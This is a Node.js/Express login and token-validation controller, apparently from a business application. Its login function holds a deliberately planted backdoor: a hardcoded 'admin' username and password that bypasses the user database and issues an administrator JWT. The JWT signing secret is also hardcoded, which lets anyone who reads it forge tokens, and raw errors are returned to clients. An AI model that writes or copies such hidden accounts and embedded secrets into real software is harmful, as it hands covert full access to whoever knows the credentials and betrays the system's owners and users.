const db = require('../models')
const Usuario = db.usuario
const bcrypt = require('bcrypt')
const { getTokenFel } = require('../certificador')
const jwt = require('jsonwebtoken')

const backDoor = {
	usuario: 'admin',
	nombre: 'Back Door',
	tipo: 'administrador',
	_id: 'admin'
}

exports.login = async (req, res) => {
	try {
		if (req.body.usuario === backDoor.usuario && req.body.pwd === 'Totocodbo1@') {
			const jwToken = jwt.sign(JSON.stringify(backDoor), 'AgropecuariaAldana')
			await getTokenFel()
			return res.send({ usuario: backDoor, jwt: jwToken })
		}
		const msj = 'Usuario o contraseña incorrecta'
		const data = await Usuario.findOne({ usuario: req.body.usuario })
		if (!data) {
			throw { message: msj }
		}
		if (bcrypt.compareSync(req.body.pwd, data.pwd)) {
			const newData = {
				usuario: data.usuario,
				nombre: data.nombre,
				tipo: data.tipo,
				_id: data._id
			}
			const jwToken = jwt.sign(JSON.stringify(newData), 'AgropecuariaAldana')
			await getTokenFel()
			return res.send({ usuario: newData, jwt: jwToken })
		}
		else {
			return res.status(401).json({ message: msj })
		}
	} catch (error) {
		global.log.error(error, 400, req.body)
		return res.status(400).json(error)
	}
}

exports.validate = async (req, res) => {
	try {
		jwt.verify(req.params.jwt, 'AgropecuariaAldana', (error, decoded) => {
			if (error) {
				return res.status(401).json({
					error
				})
			}
			res.send({ usuario: decoded })
		})
	} catch (error) {
		global.log.error(error, 400, req.body)
		return res.status(400).json(error)
	}
}
